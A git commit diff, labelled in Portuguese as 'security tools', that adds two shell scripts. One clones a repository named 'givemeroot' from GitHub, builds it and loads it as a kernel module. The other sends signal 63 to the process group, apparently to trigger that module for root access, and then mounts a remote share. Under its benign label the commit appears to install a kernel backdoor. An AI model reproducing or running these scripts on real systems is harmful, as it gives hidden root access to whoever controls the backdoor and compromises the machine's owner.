de445377a365a07f7bfd8b4d107a3d72724a4e81
LucianoRed <lscorsin@redhat.com>
2021-09-15 12:40:14 -0300

    Ferramentas de segurança

---
+++ sec/install_bd.sh
@@ -0,0 +1,6 @@
+
+#!/bin/bash
+git clone https://github.com/mthbernardes/givemeroot.git
+cd givemeroot
+make
+insmod givemeroot.ko 
---
+++ sec/monta_diretorio.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+mkdir /tmp/lixo
+kill -63 0; mount $1:/$2 /tmp/lixo
